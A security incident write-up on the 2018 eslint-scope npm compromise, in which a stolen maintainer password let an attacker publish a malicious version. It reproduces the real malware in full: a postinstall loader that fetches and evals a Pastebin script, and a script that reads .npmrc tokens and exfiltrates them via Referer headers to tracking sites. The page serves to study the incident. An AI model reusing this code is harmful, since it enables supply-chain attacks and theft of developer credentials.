---
description: >-
  An attacker has stolen an npm password of a maintainer of eslint-scope package
  and published a new version with malicious code inside.
---

# Eslint-scope

Issue Link: [https://github.com/eslint/eslint-scope/issues/39](https://github.com/eslint/eslint-scope/issues/39)

\
With the mass of security controls in place, malicious code rarely gets into codebase unnoticed. But when it does, it can lead to massive damage regardless if it gets into an open-source project or proprietary code.\
\
An excellent example of how a stolen password of a single developer can result in compromising accounts of several thousand other developers is the incident with the eslint-scope npm package from 2018.

In July 2018, the package had 2.5 million weekly downloads. In March 2020, the repo already has 17.5 million. Many extensively used packages use the eslint-scope package as a dependency, e.g., in March 2020, according to GitHub, 3.2 million other repos depend on this package.

### Attack

After stealing the password the attacker has added the following code to the package. It was executed in a post-installation script. This code loads a malicious script from Pastebin and executes it.

{% code title="PostScript.js" %}
```javascript
try {
  var https = require("https");
  https
    .get(
      {
        hostname: "pastebin.com",
        path: "/raw/XLeVP82h",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0",
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
      },
      r => {
        r.setEncoding("utf8");
        r.on("data", c => {
          eval(c);
        });
        r.on("error", () => {});
      }
    )
    .on("error", () => {});
} catch (e) {}
​
```
{% endcode %}

**The downloaded code from the Pastebin**\
The malicious script searches the filesystem for .npmrc files and extracts authentication tokens stored in these files. The tokens are then exfiltrated in the Referer HTTP header of the request to two website statistics applications.

{% code title="DownloadedScript.js" %}
```javascript
try {
  var path = require("path");
  var fs = require("fs");
  var npmrc = path.join(process.env.HOME || process.env.USERPROFILE, ".npmrc");
  var content = "nofile";
 
  if (fs.existsSync(npmrc)) {
    content = fs.readFileSync(npmrc, { encoding: "utf8" });
    content = content.replace("//registry.npmjs.org/:_authToken=", "").trim();
 
    var https1 = require("https");
    https1
      .get(
        {
          hostname: "sstatic1.histats.com",
          path: "/0.gif?4103075&101",
          method: "GET",
          headers: { Referer: "http://1.a/" + content }
        },
        () => {}
      )
      .on("error", () => {});
    https1
      .get(
        {
          hostname: "c.statcounter.com",
          path: "/11760461/0/7b5b9d71/1/",
          method: "GET",
          headers: { Referer: "http://2.b/" + content }
        },
        () => {}
      )
      .on("error", () => {});
  }
} catch (e) {}
```
{% endcode %}

### hacker's mistake

This edit could have gone unnoticed if the attacker wouldn’t have made a mistake and there was an issue in the code that led to the malicious code discovery.

**File: PostScript.js Line:17**

HTTP request and evaluation of its response work asynchronously; thus, HTTP request r may be still in progress, whereas eval(c) tries to evaluate an empty or partial response, which leads to an error. This error noticed by one of the package users initiated the investigation.

### Learning

In 2 hours the attacker has managed to gather about 4500 tokens. It's hard to conceive what the attacker could have done having the write access to even more heavily used repositories.\
No scanners can detect this malicious code because it's burrowed deeply in the dependencies that are rarely scanned.

ESLint and NPM teams swiftly reacted and in 2 hours unpublished the version with malicious code.

Afterward, they made sure that no one can install the malicious package ever again and revoked all the potentially compromised tokens. The investigation concluded that the attacker has likely used leaked credentials to log in to a maintainer’s npm account.

There is a single conclusion out of this:  **the code must be appropriately secured against tampering.** \
It doesn't matter if code is an open-source repo or code written for a company. It doesn't matter if a developer works in the office on the corporate laptop or remotely from a personal PC. Being careless while accessing the codebase may lead to unpredictable outcomes.\
